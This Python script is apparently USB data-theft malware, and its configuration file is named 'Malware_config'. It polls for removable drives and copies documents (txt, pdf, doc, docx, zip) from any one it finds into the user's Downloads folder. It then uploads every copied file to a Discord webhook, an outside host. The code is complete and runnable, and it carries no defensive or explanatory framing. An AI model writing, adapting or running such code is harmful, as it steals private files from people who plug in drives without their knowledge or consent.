import os
import time
import threading
import psutil
import requests
from custom_logger import CustomLogger
from concurrent.futures import ThreadPoolExecutor
from json_read_module import JSONReader,JSONParser

from FLAG import BotEnvironmentVariable


class Usb_DiscordHandler:
    def __init__(self, webhook_url, logger):
        self.webhook_url = webhook_url
        self.logger = logger

    def _send_file_to_discord(self, file_path, content):
        try:
            with open(file_path, "rb") as file:
                file_data = file.read()

                file_name = os.path.basename(file_path)

                # Send file data to Discord using the webhook, including the file name
                response = requests.post(self.webhook_url, data={"content": content}, files={"file": (file_name, file_data)})

                if response.status_code != 200:
                    self.logger.log_error(
                        f"Failed to send file to Discord: {file_path}, Status code: {response.status_code}, Response: {response.text}")

        except Exception as e:
            self.logger.log_error(f"Error sending file to Discord: {file_path}, Error: {e}")


class FileCopier:
    def __init__(self, logger):
        self.logger = logger
        self.copy_lock = threading.Lock()

    def copy_file(self, source_path, destination_path):
        try:
            with self.copy_lock:
                with open(source_path, 'rb') as src_file, open(destination_path, 'wb') as dest_file:
                    while chunk := src_file.read(1024 * 1024):
                        dest_file.write(chunk)

        except Exception as e:
            self.logger.log_error(f"Error copying file {source_path}: {e}")


class USBDriveMonitor:
    def __init__(self, discord_handler, logger, file_copier, bot_env_var, settings):
        self.discord_handler = discord_handler
        self.bot_env_var = bot_env_var
        self.logger = logger
        self.file_copier = file_copier
        self.desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        self.thread_pool = ThreadPoolExecutor(max_workers=10)  # Initialize the thread pool
        self.copied_files = set()
        self.settings = settings
        self.allowed_extensions = self.settings.get_value("allowed_extensions", ['txt', 'pdf', 'docx', 'doc', 'zip'])
        self.destination_folder_base = self.settings.get_value("destination_folder_base", "Destination")
        self.skip_drives = settings.get_value("skip_drives", [])

    # Inside USBDriveMonitor class

    def find_pen_drive(self, skip_drive_names=None):
        try:
            partitions = psutil.disk_partitions(all=True)
            for partition in partitions:
                if os.name == 'nt':
                    if 'removable' in partition.opts.lower() and os.path.exists(partition.device):
                        drive_name = partition.device.split('\\')[-1]
                        if skip_drive_names is None or drive_name not in skip_drive_names:
                            return partition.device
                elif os.name == 'posix':
                    if 'removable' in partition.fstype.lower() and os.path.exists(partition.mountpoint):
                        drive_name = os.path.basename(partition.mountpoint)
                        if skip_drive_names is None or drive_name not in skip_drive_names:
                            return partition.mountpoint

            return None
        except Exception as e:
            self.logger.log_error(f"Error: {str(e)}")
            return None

    def _send_discord_message(self, file_path):
        try:
            content = f"New file copied from USB drive: {file_path}"
            self.discord_handler._send_file_to_discord(file_path, content)

        except Exception as e:
            self.logger.log_error(f"Error sending message to Discord: {e}")

    def _create_destination_folder(self):
        try:
            timestamp = time.strftime("%Y%m%d%H%M%S")
            destination_folder_name = f"{self.destination_folder_base}{timestamp}"

            # Use the user's Downloads directory
            downloads_dir = os.path.expanduser("~/Downloads")
            destination_folder_path = os.path.join(downloads_dir, destination_folder_name)

            os.makedirs(destination_folder_path, exist_ok=True)

            return destination_folder_path

        except Exception as e:
            self.logger.log_error(f"Error creating destination folder: {e}")
            return None

    def copy_pendrive(self, pendrive_path, destination_folder):
        try:
            if not os.path.exists(pendrive_path):
                self.logger.log_warning("Pendrive removed during copying. Aborting.")
                return

            for root, dirs, files in os.walk(pendrive_path):
                for file_name in files:
                    source_file_path = os.path.join(root, file_name)
                    destination_file_path = os.path.join(destination_folder, file_name)

                    if os.path.isdir(source_file_path):
                        self.copy_pendrive(source_file_path, destination_file_path)  # Recursively copy files in subfolders
                    else:
                        file_extension = file_name.split('.')[-1].lower()
                        if file_extension not in self.allowed_extensions:
                            continue

                        if os.path.getsize(source_file_path) == 0:
                            self.logger.log_warning(f"Skipping file '{file_name}' with 0 bytes size.")
                            continue

                        try:
                            with open(source_file_path, 'rb') as file:
                                file_content = file.read()
                        except Exception as e:
                            self.logger.log_warning(f"Skipping file '{file_name}' due to corruption: {e}")
                            continue

                        self.file_copier.copy_file(source_file_path, destination_file_path)

        except Exception as e:
            self.logger.log_error(f"Error copying pendrive: {e}")

    def wait_pendrive_to_be_removed(self, pendrive_path):
        while os.path.exists(pendrive_path):
            pass

    def handle_usb_drive(self, usb_drive_path):
        try:
            self.logger.log(f"Handling USB drive: {usb_drive_path}")

            destination_folder = self._create_destination_folder()

            self.copy_pendrive(usb_drive_path, destination_folder)

            self.logger.log("USB drive handling completed.")

            self._send_discord_messages_parallel(destination_folder)
            self.wait_pendrive_to_be_removed(usb_drive_path)

            self.logger.log("USB drive was pluged out.")

        except Exception as e:
            self.logger.log_error(f"Error handling USB drive: {e}")

    def _send_discord_messages_parallel(self, copied_folder):
        try:
            file_paths = []
            for root, _, files in os.walk(copied_folder):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    file_paths.append(file_path)

            for file_path in file_paths:
                self.thread_pool.submit(self._send_discord_message, file_path)

        except Exception as e:
            self.logger.log_error(f"Error sending files to Discord: {e}")

    def cleanup(self):
        self.thread_pool.shutdown(wait=True)

    def main_monitoring_loop(self):
        try:
            while self.bot_env_var.check_bot_run_status():
                usb_drive_path = self.find_pen_drive(self.skip_drives)

                if usb_drive_path:
                    self.logger.log(f"Detected USB drive: {usb_drive_path}")
                    self.handle_usb_drive(usb_drive_path)
                else:
                    time.sleep(1)

        except Exception as e:
            self.logger.log_error(f"Error in USB drive monitoring: {e}")

def load_settings(json_reader, file_name):
    settings_json_string = json_reader.get_json_string(file_name)
    setting = JSONParser(settings_json_string)
    return setting

def main():
    try:
        file_name = "Malware_config"  # Replace with the actual JSON settings file
        json_reader = JSONReader(file_name)
        settings = load_settings(json_reader, "USBDriveMonitor")

        discord_webhook_url = settings.get_value("discord_webhook_url")
        logger = CustomLogger()
        discord_handler = Usb_DiscordHandler(discord_webhook_url, logger)
        file_copier = FileCopier(logger)
        bot_env_var = BotEnvironmentVariable("NOTES_BOT_RUN")  # Replace with your bot_env_var instantiation

        usb_monitor = USBDriveMonitor(discord_handler, logger, file_copier, bot_env_var, settings)
        usb_thread = threading.Thread(target=usb_monitor.main_monitoring_loop)
        usb_thread.start()

        usb_thread.join()
        usb_monitor.cleanup()

    except Exception as e:
        print(f"Error in main: {e}")


if __name__ == "__main__":
    main()
